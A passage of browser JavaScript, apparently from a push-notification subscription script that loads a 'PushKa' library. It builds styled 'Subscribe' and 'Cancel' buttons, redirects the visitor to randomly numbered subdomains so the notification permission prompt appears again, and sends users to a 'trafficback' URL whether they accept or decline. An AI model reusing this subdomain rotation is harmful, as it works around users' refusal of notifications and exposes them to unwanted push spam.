        btnClose.id = self.config.namePrefix+btnCloseDefaultClass;
        btnClose.style.border = '1px solid #c8c8c8';
        btnClose.style.borderRadius = '5px';
        btnClose.style.color = '#00000078';
        btnClose.style.fontWeight = 'bold';
        btnClose.style.fontSize = '11px';
        btnClose.style.padding = '9px 16px';
        btnClose.style.marginLeft = '8px';
        btnClose.style.textDecoration = 'none';
        btnClose.style.cursor = 'pointer';

        if (isMobile(navigator.userAgent) === true)
        {
            btnClose.style.border = 'none';
            btnClose.style.fontSize = '3.5vw';
            btnClose.style.color = '#0172b5';
        }

        var btnCloseText = document.createTextNode(text('btnCancel'));

        var btnAllow = document.createElement("a");
        btnAllow.id = self.config.namePrefix+'subs-button';
        btnAllow.style.border = '1px solid #c8c8c8';
        btnAllow.style.borderRadius = '5px';
        btnAllow.style.color = '#00000078';
        btnAllow.style.fontWeight = 'bold';
        btnAllow.style.fontSize = '11px';
        btnAllow.style.padding = '9px 16px';
        btnAllow.style.marginLeft = '8px';
        btnAllow.style.textDecoration = 'none';
        btnAllow.style.cursor = 'pointer';

        if (isMobile(navigator.userAgent) === true)
        {
            btnAllow.style.border = 'none';
            btnAllow.style.fontSize = '3.5vw';
            btnAllow.style.color = '#0172b5';
        }

        var btnAllowText = document.createTextNode(text('btnSubscribe'));

        p.appendChild(pText);
        div.appendChild(p);
        div.appendChild(a);
        div.appendChild(notificationImg);
        div.appendChild(span);
        btnAllow.appendChild(btnAllowText);
        btnClose.appendChild(btnCloseText);

        if (isMac() === true || isMobile(navigator.userAgent) === true) {
            divBtn.appendChild(btnClose);
            divBtn.appendChild(btnAllow);
        }
        else {
            divBtn.appendChild(btnAllow);
            divBtn.appendChild(btnClose);
        }

        div.appendChild(divBtn);

        if (isMobile(navigator.userAgent) === true)
        {
            overlay.appendChild(div);
            document.body.appendChild(overlay);

            overlay.style.display = 'none';

            return overlay;
        }

        document.body.appendChild(div);

        div.style.display = 'none';

        return div;
    }

    function heightEl(el)
    {
        console.log({
            height       : el.height,
            innerHeight  : el.innerHeight,
            offsetTop    : el.offsetTop,
            offsetHeight : el.offsetHeight,
            availHeight  : el.availHeight
        });
    }

    function isMobile(userAgent) {
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent))
            return true;

        return false;
    }

    function redirectToPromptWindow() {
        var urlObj = new URL(window.location.href);
        urlObj.searchParams.set('ask', 'yes');

        var hostname = urlObj.hostname.replace(/(ms-[0-9]{1,2}\.)*(.+)/, '$2'),
            newUrl = urlObj.protocol + '//ms-' + randomInteger(1, 99) + '.' + hostname + urlObj.pathname + urlObj.search;

        window.location.href = newUrl;

        return true;
    }

    function redirectToSelfWindow() {
        var urlObj = new URL(window.location.href);

        if(urlObj.searchParams.has('ask'))
            urlObj.searchParams.delete('ask');

        urlObj.searchParams.set('self', 'yes');

        var hostname = urlObj.hostname.replace(/(ms-[0-9]{1,2}\.)*(.+)/, '$2'),
            newUrl = urlObj.protocol + '//ms-' + randomInteger(1, 99) + '.' + hostname + urlObj.pathname + urlObj.search;

        window.location.href = newUrl;

        return true;
    }

    function startOnSubDomain(startDelay, timeout )
    {
        self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
        self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;

        createManifest(self.config.manifestUrl); // create only on all-origin or same-origin

        if( 'PushKa' in window )
            startOnSubdomainInit();
        else
            loadScript(self.config.pushKaScript, startOnSubdomainInit, function(){console.error('Error on load PushKa script')});
    }

    function startOnSubdomainInit()
    {
        if( getIsSubscribed())
            return console.log('activated');

        if( getIsSupport())
            return console.log('Not support push');

        objPushKa = new PushKa({
            mode         : 'same-origin', /* 'same-origin', 'system-origin', 'partner-origin', 'all-origin',*/
            pid          : self.config.pid,
            appId        : self.config.appId,
            sourceId     : self.config.sourceId,
            landingId    : self.config.landingId,
            marks        : self.config.marks,
            addVars      : self.config.addVars,
            afterInit    : initSubscribeHandler,
            subscribe    : successSubdomainSubs,
            declined     : declineSubdomainSubs,
            notSupported : notSupportSubs
        });
    }

    function successSubdomainSubs()
    {
        successSelfSubs();
        doRedirect(false);
        doRedirect(self.config.redirect.trafficbackUrl);
    }

    function declineSubdomainSubs()
    {
        declineSelfSubs();
        doRedirect(false);
        doRedirect(self.config.redirect.trafficbackUrl);
    }

    function isMac() {
        if (navigator.platform.toUpperCase().indexOf('MAC') >= 0)
            return true;

        return false;
    }
}